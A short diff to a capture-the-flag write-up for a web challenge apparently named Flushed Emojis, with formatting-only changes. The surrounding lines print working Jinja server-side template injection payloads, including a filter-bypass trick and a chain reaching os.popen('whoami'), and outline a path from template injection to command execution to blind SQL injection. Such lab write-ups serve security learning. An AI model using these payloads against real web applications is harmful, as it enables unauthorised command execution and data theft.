@@ -11,7 +11,7 @@ tags: web, ssti, sqli
 
 Flushed emojis are so cool! Learn more about them here!
 
-![FlushedEmojis.zip](./FlushedEmojis.zip)
+[FlushedEmojis.zip](./FlushedEmojis.zip)
 
 ## Read source code
 Have 2 sources code
@@ -72,7 +72,7 @@ SSTI -> RCE  -> Request data-server -> boolean-base sqli.
 I use config|attr('items')() --> Pass
 
 ### SSTI to RCE 
-{{ (config|attr('from_object'))('os') }}
+{{ (config|attr('from_object'))('os') }}        
 {{((config|attr('__class__')|attr('__init__')|attr('__globals__'))['os']|attr('popen'))('whoami')|attr('read')()}} -> user
 
 3. RCE to SQLI
